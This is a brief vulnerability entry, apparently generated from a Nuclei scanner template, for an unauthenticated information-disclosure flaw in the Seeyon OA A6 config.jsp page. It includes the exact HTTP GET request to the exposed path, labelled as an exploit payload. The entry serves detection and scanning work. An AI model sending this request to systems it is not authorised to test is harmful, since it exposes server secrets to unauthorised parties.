# Vulnerability: Seeyon OA A6 config.jsp - Information Disclosure
**Classification:** SEEYON
**Source:** Nuclei Template (`seeyon-config-exposure.yaml`)

## Description
The Seeyon OA A6 config.jsp page can be accessed without authorization, resulting in sensitive information leakage vulnerabilities, through which attackers can obtain sensitive information in the server

## Vulnerable Code Pattern / Exploit Payload
```http
GET /yyoa/ext/trafaxserver/SystemManage/config.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

